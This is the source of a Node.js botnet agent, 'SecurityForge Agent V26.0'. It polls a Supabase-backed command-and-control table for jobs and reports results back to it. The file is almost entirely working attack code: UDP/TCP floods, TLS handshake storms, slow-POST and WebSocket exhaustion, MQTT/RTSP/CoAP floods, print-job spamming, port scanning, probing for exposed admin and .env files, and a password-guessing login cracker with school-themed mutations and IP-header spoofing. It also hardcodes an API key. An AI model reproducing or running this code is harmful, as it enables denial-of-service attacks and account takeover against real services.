/**
 * SECURITYFORGE AGENT V26.0 (FINAL POLISH)
 * - V26.0: Fixed Regex Syntax Error, Job Memory Cleaning.
 * - V25.0: IoT Banner Grabbing, Hypervisor.
 * - V23.0: Fatal Four (GraphQL, RUDY, ReDoS, WebSocket).
 * - V22.0: IoT Module.
 */
const https = require('https');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const dgram = require('dgram');
const tls = require('tls');
const dns = require('dns');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// --- SMART GENERATOR ASSETS ---
const BASE_PASSWORDS = [
    '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', 'master', 'mysql', 'root123',
    'admin123', 'admin', 'pass', '1234567890', 'welcome', '123123', 'password123', 'monkey', 'letmein', 'football', 'access', 'shadow',
    'mustang', 'superman', 'michael', 'batman', '666666', '888888', 'princess', 'solo', 'starwars', 'killer', 'charlie', 'jordan', 'hockey',
    'iloveyou', 'secret', 'sunshine', 'hunter', 'login', 'admin@123', 'p@ssword', 'changeme', 'system', 'root', 'support', '1234567890a',
    'student', 'class', 'teacher', 'exam', 'school', 'college', 'principal', 'staff', 'admission', 'result', '2024', '2025'
];
const USERS = ['admin', 'administrator', 'root', 'user', 'test', 'guest', 'info', 'support', 'sysadmin', 'manager', 'service', 'operator'];
const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  

// --- KEEPALIVE SERVER ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V26.0 ACTIVE'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: NATIVE SUPABASE ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => { 
                    if (res.statusCode >= 400) {
                        resolve(null);
                    } else {
                        try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
                    }
                });
            });
            req.on('error', (e) => reject(e));
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[35m[AGENT] Initialized V26.0 (FINAL POLISH). Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;
let logBuffer = [];

// --- DYNAMIC SCALING (AUTO-MEM) ---
const MAX_RAM_BYTES = 400 * 1024 * 1024; 
const checkMemory = () => {
    const used = process.memoryUsage().heapUsed;
    return used < MAX_RAM_BYTES;
};

const logToC2 = (msg) => {
    console.log(msg);
    logBuffer.push(msg.replace(/\x1b\[[0-9;]*m/g, ''));
};

const startAttack = (job) => {
    if (activeJob) return;
    activeJob = job;
    const duration = (job.duration && job.duration > 0) ? job.duration : 30;
    const startTime = Date.now();
    logBuffer = []; // CLEAR LOG BUFFER ON START

    console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Target: ${job.concurrency} | D: ${duration}s\x1b[0m`);
    logToC2(`[SYSTEM] Swarm Engaged. Target: ${job.target}`);
    
    if(job.use_port_scan) logToC2(`[RECON] Starting Port Scan on ${job.target}...`);
    if(job.use_login_siege) logToC2(`[CRACK] Starting ZERO-TRUST CRACK (V19) on Login Portal...`);
    if(job.use_iot_death_ray) logToC2(`[IOT] ENGAGING IOT DEATH RAY (Unified Kill)...`);
    if(job.use_ghost_writer) logToC2(`[GHOST] Starting GHOST WRITER broadcast: "${job.ghost_message || 'TEST'}"`);
    
    let running = true;
    let totalRequests = 0;
    let jobSuccess = 0;
    let jobFailed = 0;
    let jobLatencySum = 0;
    let jobReqsForLatency = 0;
    let jobMaxLatency = 0;
    let consecutiveFailures = 0;

    // --- CONTEXT AWARE GENERATOR ---
    let SMART_PASSWORDS = [...BASE_PASSWORDS];
    if (job.use_login_siege) {
        try {
            const urlObj = new URL(job.target);
            const domainParts = urlObj.hostname.split('.');
            const mainName = domainParts.length > 2 ? domainParts[domainParts.length-2] : domainParts[0];
            const mutations = [
                mainName, mainName+'123', mainName+'2024', mainName+'2025', mainName+'@123', 
                'admin@'+mainName, mainName+'admin', mainName+'!', mainName+'#',
                'school', 'school123', 'student', 'class', 'teacher'
            ];
            SMART_PASSWORDS = [...mutations, ...BASE_PASSWORDS];
            logToC2(`[CRACK] Generated ${mutations.length} context-specific mutations for ${mainName}`);
        } catch(e) {}
    }

    // --- EXECUTION MODULES ---
    if (job.use_ghost_writer) {
        // ... GHOST WRITER ...
        const [host, portStr] = job.target.split(':');
        const targetIP = host; 
        const message = job.ghost_message || "SECURITY ALERT: NETWORK AUDIT IN PROGRESS.";
        
        const broadcast = () => {
            if (!running) return;
            const c1 = new net.Socket(); c1.setTimeout(2000);
            c1.connect(9100, targetIP, () => { c1.write(message + "\r\n\r\n"); c1.destroy(); logToC2(`[GHOST] Sent print job to ${targetIP}:9100`); jobSuccess++; });
            c1.on('error', () => {});
            
            const c2 = new net.Socket(); c2.setTimeout(2000);
            c2.connect(8080, targetIP, () => { c2.write(message + "\r\n"); c2.destroy(); jobSuccess++; });
            c2.on('error', () => {});
            
            totalRequests+=2;
            if (running) setTimeout(broadcast, 1000);
        };
        broadcast();
    }
    else if (job.use_iot_death_ray) {
        // ... IOT DEATH RAY ...
        const [host, portStr] = job.target.split(':');
        const mqttConnect = Buffer.from('101000044d5154540402003c000469643031', 'hex');
        const rtspPayload = `DESCRIBE rtsp://${host}/media.amp RTSP/1.0\r\nCSeq: 1\r\n\r\n`;
        const coapPayload = Buffer.from('40011234', 'hex');
        const deathRay = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(deathRay, 200);
            try {
                const c1 = new net.Socket(); c1.connect(1883, host, () => { c1.write(mqttConnect); c1.destroy(); jobSuccess++; }); c1.on('error', () => {});
                const c2 = new net.Socket(); c2.connect(554, host, () => { c2.write(rtspPayload); c2.destroy(); jobSuccess++; }); c2.on('error', () => {});
                const c3 = dgram.createSocket('udp4'); c3.send(coapPayload, 5683, host, () => c3.close());
                totalRequests+=3;
            } catch(e) {}
            if (running) setImmediate(deathRay);
        };
        for(let i=0; i<Math.min(job.concurrency, 200); i++) deathRay();
    }
    else if (job.use_websocket_tsunami) {
        // ... WS TSUNAMI ...
        const tsunami = () => {
            if (!running) return;
            try {
                const client = new net.Socket();
                const [h, p] = job.target.replace('http://','').split(':');
                client.connect(p||80, h, () => {
                    client.write("GET / HTTP/1.1\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n");
                    setTimeout(() => client.destroy(), 10000); 
                    jobSuccess++; totalRequests++;
                });
                client.on('error', () => { jobFailed++; });
            } catch(e) {}
            if (running) setTimeout(tsunami, 10);
        };
        for(let i=0; i<Math.min(job.concurrency, 500); i++) tsunami();
    }
    else if (job.use_rudy) {
        // ... R.U.D.Y. ...
        const [host, portStr] = job.target.replace('http://','').replace('https://','').split('/')[0].split(':');
        const port = parseInt(portStr) || 80;
        const rudy = () => {
            if (!running) return;
            try {
                const client = new net.Socket();
                client.connect(port, host, () => {
                    client.write(`POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 10000\r\n\r\n`);
                    let tick = 0;
                    const interval = setInterval(() => {
                        if(!running || tick > 10) { clearInterval(interval); client.destroy(); return; }
                        client.write("A"); tick++;
                    }, 10000);
                    jobSuccess++; totalRequests++;
                });
                client.on('error', () => { jobFailed++; });
            } catch(e) {}
            if (running) setTimeout(rudy, 50);
        }
        for(let i=0; i<Math.min(job.concurrency, 500); i++) rudy();
    }
    else if (job.use_mqtt_flood || job.use_rtsp_storm || job.use_coap_burst || job.use_dns_reaper || job.use_syn_flood || job.use_frag_attack) {
        // ... NETJAM/IOT SINGLES ...
        const [host, portStr] = job.target.split(':');
        const flood = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(flood, 100);
            try {
                // Simplified Logic for individual NetJam vectors
                if(job.use_dns_reaper || job.use_coap_burst || job.use_frag_attack) {
                    const c = dgram.createSocket('udp4');
                    const port = job.use_dns_reaper ? 53 : (job.use_coap_burst ? 5683 : 80);
                    c.send(JUNK_DATA_SMALL, port, host, () => c.close());
                } else {
                    const c = new net.Socket();
                    const port = job.use_mqtt_flood ? 1883 : (job.use_rtsp_storm ? 554 : 80);
                    c.connect(port, host, () => { c.destroy(); });
                    c.on('error', ()=>{});
                }
                totalRequests++;
            } catch(e) {}
            if (running) setImmediate(flood);
        };
        for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
    }
    else if (job.use_admin_hunter) {
        // ... ADMIN HUNTER ...
        let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
        const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/backup.sql', '/api/v1/users', '/root', '/panel', '/phpinfo.php'];
        const scan = (pathIndex) => {
            if (!running) return;
            const path = ADMIN_PATHS[pathIndex % ADMIN_PATHS.length];
            const opts = { hostname: targetUrl.hostname, path: path, method: 'GET', timeout: 3000 };
            const req = https.request(opts, (res) => {
                if (res.statusCode === 200) logToC2(`[VULN] Found Publicly Accessible: ${targetUrl.protocol}//${targetUrl.hostname}${path}`);
                else if (res.statusCode === 403) logToC2(`[WARN] Found Protected: ${path} (403)`);
                totalRequests++;
                if (running) setImmediate(() => scan(pathIndex + 1));
            });
            req.on('error', () => { if(running) setImmediate(() => scan(pathIndex + 1)); });
            req.end();
        };
        for(let i=0; i<20; i++) scan(i);
    }
    else if (job.use_port_scan) {
        // ... PORT SCAN (BANNER GRABBING V25 + REGEX FIX V26) ...
        let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
        if (targetHost.includes('/')) targetHost = targetHost.split('/')[0];
        
        const scanPort = (idx) => {
            if (!running) return;
            const port = TOP_PORTS[idx % TOP_PORTS.length];
            const socket = new net.Socket();
            socket.setTimeout(2000);
            socket.on('connect', () => {
                // Banner Grab
                socket.write('HEAD / HTTP/1.0\r\n\r\n');
            });
            socket.on('data', (data) => {
                const s = data.toString();
                const server = s.match(/Server: (.+)/i);
                // FIXED REGEX SYNTAX ERROR HERE
                const title = s.match(/<title>(.+)<\/title>/i);
                const banner = server ? server[1] : (title ? title[1] : s.substring(0, 50).replace(/\r\n/g, ' '));
                logToC2(`[OPEN] Port ${port} is OPEN on ${targetHost} | Banner: ${banner.trim() || 'Unknown'}`);
                socket.destroy();
            });
            socket.on('connect', () => {
                 // Fallback if no data received but connected
                 setTimeout(() => { if(!socket.destroyed) { logToC2(`[OPEN] Port ${port} is OPEN (No Banner)`); socket.destroy(); } }, 500);
                 jobSuccess++; totalRequests++; consecutiveFailures = 0;
            });

            socket.on('timeout', () => { 
                socket.destroy(); totalRequests++; consecutiveFailures++;
                if (consecutiveFailures === 15) logToC2(`[ERROR] Target Unreachable. Are you scanning a Local IP from Cloud?`);
            });
            socket.on('error', () => { 
                totalRequests++; consecutiveFailures++; 
            });
            socket.connect(port, targetHost);
            if (running) setTimeout(() => scanPort(idx + 1), 200); 
        }
        for(let i=0; i<5; i++) scanPort(i); 
    }
    else if (job.use_ssl_storm) {
        // ... SSL STORM ...
        let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
        const host = targetUrl.hostname;
        const storm = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(storm, 100);
            try {
                const socket = tls.connect(443, host, { rejectUnauthorized: false }, () => { socket.destroy(); jobSuccess++; totalRequests++; });
                socket.on('error', () => { jobFailed++; totalRequests++; });
            } catch(e) {}
            if (running) setImmediate(storm);
        };
        for(let i=0; i<Math.min(job.concurrency, 400); i++) storm();
    }
    else if (job.method === 'UDP' || job.method === 'TCP') {
        // ... UDP/TCP FLOOD ...
        const [host, portStr] = job.target.split(':');
        const port = parseInt(portStr) || 80;
        const flood = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(flood, 100); 
            try {
                if (job.method === 'UDP') {
                    const client = dgram.createSocket('udp4');
                    client.send(JUNK_DATA_SMALL, port, host, (err) => { client.close(); if (!err) jobSuccess++; else jobFailed++; totalRequests++; });
                } else {
                    const client = new net.Socket();
                    client.connect(port, host, () => { client.write(JUNK_DATA_SMALL); client.destroy(); jobSuccess++; totalRequests++; });
                    client.on('error', () => { jobFailed++; totalRequests++; });
                }
            } catch(e) {}
            if (running) setImmediate(flood);
        };
        for(let i=0; i<Math.min(job.concurrency, 500); i++) flood(); 
    } 
    else {
        // --- STRESS / LOGIN MODULE (HTTP) ---
        let targetUrl;
        try { targetUrl = new URL(job.target); } catch(e) { return; }
        const agent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });

        const performRequest = () => {
            if (!running) return;
            if (!checkMemory()) return setTimeout(performRequest, 100); 

            const lib = targetUrl.protocol === 'https:' ? https : http;
            const start = Date.now();
            let body = job.body;
            let method = job.method || 'GET';
            let creds = null;

            // Headers setup
            const headers = {
                'User-Agent': 'SecurityForge/26', 
                'Content-Type': 'application/json',
                ...((typeof job.headers === 'string' ? {} : job.headers) || {})
            };

            if (job.use_login_siege) {
                method = 'POST';
                const user = USERS[Math.floor(Math.random() * USERS.length)];
                const pass = SMART_PASSWORDS[Math.floor(Math.random() * SMART_PASSWORDS.length)];
                
                if (job.use_form_data) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                    if (job.login_type === 'PASS_ONLY') { creds = ['(PIN)', pass]; body = `password=${encodeURIComponent(pass)}`; }
                    else if (job.login_type === 'MODAL_API') { creds = [user, pass]; body = `email=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`; }
                    else { creds = [user, pass]; body = `username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`; }
                } else {
                    if (job.login_type === 'PASS_ONLY') { creds = ['(PIN)', pass]; body = JSON.stringify({ password: pass }); }
                    else if (job.login_type === 'MODAL_API') { creds = [user, pass]; body = JSON.stringify({ email: user, password: pass }); }
                    else { creds = [user, pass]; body = JSON.stringify({ username: user, password: pass }); }
                }
            } else if (job.use_goldeneye || job.use_xml_bomb) {
                if (job.use_xml_bomb) body = MALICIOUS_PAYLOADS.XML_BOMB;
            }
            
            if (job.use_login_siege || job.use_chaos) { headers['X-Forwarded-For'] = '127.0.0.1'; headers['X-Originating-IP'] = '127.0.0.1'; }
            if (job.use_chaos) { headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + (100+Math.floor(Math.random()*20)); }

            const req = lib.request(targetUrl, { agent, method, headers }, (res) => {
                 const lat = Date.now() - start;
                 jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
                 
                 if (job.use_login_siege) {
                     let responseBody = '';
                     res.on('data', chunk => responseBody += chunk.toString());
                     res.on('end', () => {
                         const bodyLower = responseBody.toLowerCase();
                         const failKeywords = ['invalid', 'incorrect', 'fail', 'error', 'wrong', 'denied', 'match', 'try again', 'reset', 'locked', 'not found', 'unauthorized', 'check your'];
                         const successKeywords = ['dashboard', 'welcome', 'logout', 'my account', 'profile', 'settings', 'signed in', 'success":true', 'token":'];
                         let isBypass = false;

                         if (failKeywords.some(k => bodyLower.includes(k))) isBypass = false;
                         else if (successKeywords.some(k => bodyLower.includes(k))) isBypass = true;
                         else if (res.statusCode === 302 || res.statusCode === 301) {
                             const loc = (res.headers.location || '').toLowerCase();
                             if (!loc.includes('login') && !loc.includes('signin') && !loc.includes('error') && !loc.includes('?fail')) isBypass = true;
                         }

                         if (isBypass) { logToC2(`[CRITICAL] [CRACKED] CREDENTIALS FOUND: User: [${creds[0]}] | Pass: [${creds[1]}] (Status: ${res.statusCode})`); jobSuccess++; }
                         else jobFailed++; 
                     });
                 } else {
                     if (res.statusCode < 500) jobSuccess++; else jobFailed++;
                     res.resume(); 
                 }
                 totalRequests++;
                 if(running) setImmediate(performRequest);
            });
            if (body) req.write(body);
            req.on('error', () => { jobFailed++; totalRequests++; if(running) setImmediate(performRequest); });
            req.end();
        };

        const spawnLoop = setInterval(() => {
             if (!running) return clearInterval(spawnLoop);
             const safeLimit = job.use_login_siege ? 200 : job.concurrency; 
             if (checkMemory() && (totalRequests / ((Date.now() - startTime)/1000) < safeLimit)) {
                 performRequest();
             }
        }, 50);
        for(let i=0; i<20; i++) performRequest();
    }

    // Reporting Loop
    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed) || 0;
        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
        
        let statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
        const currentLogs = [...logBuffer]; 
        if (currentLogs.length > 0) { statsPayload.logs = currentLogs.join('\n'); logBuffer = []; }

        try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); } catch(e) {}

        if (duration > 0 && elapsed >= duration) {
            running = false; clearInterval(activeLoop); activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED' });
        }
    }, 2000);
};

setInterval(async () => {
    if (activeJob) return;
    try {
        const jobs = await supabaseRequest('GET', '/jobs?status=in.(PENDING,RUNNING)&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            if (job.status === 'PENDING') await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { }
}, 3000);
